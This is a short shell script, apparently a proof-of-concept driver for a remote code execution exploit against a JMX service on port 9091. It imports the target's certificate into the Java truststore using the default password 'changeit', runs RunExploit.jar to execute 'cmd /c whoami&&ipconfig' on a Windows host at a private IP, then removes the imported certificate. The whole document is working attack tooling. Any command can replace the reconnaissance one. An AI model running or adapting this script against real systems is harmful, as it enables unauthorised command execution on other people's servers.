local_ip=192.168.1.191
target_ip=192.168.1.194
jmx_port=9091
truststore=/Library/Java/JavaVirtualMachines/jdk-10.0.1.jdk/Contents/Home/lib/security/cacerts
pass=changeit
command="cmd /c whoami&&ipconfig"

echo "Starting PoC..."
echo "Target = $target_ip:$jmx_port"
echo "Truststore = $truststore"

printf "\nStep 1: Download Certificate(s)\n\n"
sudo java -jar DownloadCert.jar $target_ip $jmx_port $truststore $pass

printf "\nStep 2: Run Exploit\n"
sudo java -Djavax.net.ssl.trustStore=$truststore -jar RunExploit.jar $local_ip $target_ip $jmx_port "$command"

printf "\nStep 3: Clean up\n\n"
sudo keytool -delete -alias imc0 -keystore $truststore -storepass $pass

echo "Deleted alias 'imc0' from trust store."
